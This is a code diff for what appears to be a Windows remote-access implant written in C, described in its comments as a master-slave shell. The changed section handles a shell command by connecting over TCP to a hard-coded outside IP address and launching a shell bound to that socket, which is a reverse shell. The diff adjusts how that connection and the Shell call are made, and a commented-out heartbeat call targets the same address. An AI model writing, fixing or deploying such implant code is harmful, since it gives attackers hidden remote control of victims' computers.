@@ -39,6 +39,7 @@ int __cdecl main(int argc, char **argv)
     int INIT = 0;
     SOCKADDR_IN sa;
     PROCESS_INFORMATION pi;
+    struct addrinfo* tcp_inf = NULL;
     __sock_TCP = &sock_tcp;
     __sock_UDP = &sock_udp;
     __child = &pi;
@@ -65,6 +66,9 @@ int __cdecl main(int argc, char **argv)
     // iResult = HeartBeat("45.143.93.119", &__heartbeat);
     // printf("Initial heartbeat sent\n");
     // DBGLG("thread started: ", iResult);
+
+
+    
     if (InitServer(sock_udp, &sa) <0){
         exit(1);
     }
@@ -85,13 +89,13 @@ int __cdecl main(int argc, char **argv)
             case _SIG_SHLL:
             /* Individual command output master -> (cmd) ->slave -> (output) -> master*/
                 DBGLG("Got SHLL\n");
-                struct addrinfo* tcp_inf;
                 iResult = IpSetupTCP(&tcp_inf, "45.143.93.119");
-                iResult = Connect(&sock_tcp, tcp_inf);
+                iResult &= Connect(&sock_tcp, tcp_inf);
                 if (iResult < 0){
                     perror("failed at connecting");
                 }
-                Shell(pi, sock_tcp);
+                DBGLG("TCP success starting shell\n");
+                Shell(&pi, sock_tcp);
                 closesocket(sock_tcp);
                 DBGLG("Closing shell\n");
                 break;
